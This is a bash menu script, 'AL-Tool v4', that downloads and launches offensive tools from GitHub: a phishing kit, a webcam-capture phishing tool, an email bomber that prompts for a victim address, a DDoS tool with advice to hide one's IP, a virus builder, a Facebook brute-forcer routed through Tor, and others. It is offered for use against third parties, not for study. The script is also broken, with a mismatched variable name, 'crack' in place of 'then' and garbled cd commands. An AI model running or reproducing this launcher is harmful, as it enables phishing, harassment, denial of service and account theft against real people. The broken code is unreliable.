clear
mkdir Tools
clear
echo -e '\033[31;40;1m
  █████╗ ██╗             ████████╗ ██████╗  ██████╗ ██╗
 ██╔══██╗██║             ╚══██╔══╝██╔═══██╗██╔═══██╗██║
 ███████║██║     ███████╗   ██║   ██║   ██║██║   ██║██║
 ██╔══██║██║     ╚══════╝   ██║   ██║   ██║██║   ██║██║
 ██║  ██║███████╗           ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═╝  ╚═╝╚══════╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v4
  Coded by 4lbH4cker
  github: https://github.com/4lbH4cker
\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4lbH4cker


\e[37m[1]\e[36m Requests & Update \e[37m[2]\e[36m Phishing Tool				
\e[37m[3]\e[36m WebCam Hack       \e[37m[4]\e[36m Subscan			
\e[37m[5]\e[36m Gmail Bomber      \e[37m[6]\e[36m DDOS Attack			
\e[37m[7]\e[36m How to use?       \e[37m[8]\e[36m Uninstall downloaded programs		
\e[37m[9]\e[36m Ip Info           \e[37m[10]\e[36m dorks-eye
\e[37m[11]\e[36m HackerPro        \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter     \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod           \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY         \e[37m[18]\e[36m AUTO-IP-CHANGER

'


#Option Selection


read -p "Transaction number: " islem
if [[ $islam == 1 || $islam == 01 ]]; crack
clear

echo -e "\033[47;31;5m Installing update and requirements...\033[0m"
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update complete...\033[0m"
sleep 3
bash alhack.sh

elif [[ $islam == 2 || $islam == 02 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd ripper
bash zphisher.sh

elif [[ $islam == 3 || $islam == 03 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islam == 4 || $islam == 04 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Enter a domain e.g. (example.com): " sc
./subscan $sc
       
elif [[ $islam == 5 || $islam == 05 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m This installation will take a long time\033[0m"
echo -e "\033[47;3;35m To stop press Ctrl+C\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "--------------------------"
read -p "Enter an email address to bomb: " mail
echo "--------------------------"
php index.php start-bombing $mail

elif [[ $islam == 6 || $islam == 06 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[47;3;35m Before using it, hide your IP\033[0m"

elif [[ $islam == 7 || $islam == 07 ]]; crack
clear
echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
sleep 10
echo "Wait 10 seconds"
bash alhack.sh

 
elif [[ $islam == 8 || $islam == 08 ]]; crack
clear
echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
sleep 3
rm -rf Tools

bash alhack.sh

elif [[ $islam == 9 || $islam == 09 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islam == 10 || $islam == 010 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islam == 11 || $islam == 011 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islam == 12 || $islam == 012 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islam == 13 || $islam == 013 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
TigerVirus CD
bash app.sh

elif [[ $islam == 14 || $islam == 014 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islam == 15 || $islam == 015 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islam == 16 || $islam == 016 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
facebook cd
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $islam == 17 || $islam == 017 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
CD DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $islam == 18 || $islam == 018 ]]; crack
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
echo -e "\033[47;3;35m This tool will require you to be (ROOT)\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m go to your browser / change the proxy (sock proxy) to 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
out

else   
	clear
        echo -e '\033[36;40;1m You entered the wrong code'	
	sleep 1
	clear
	bash alhack.sh
fi
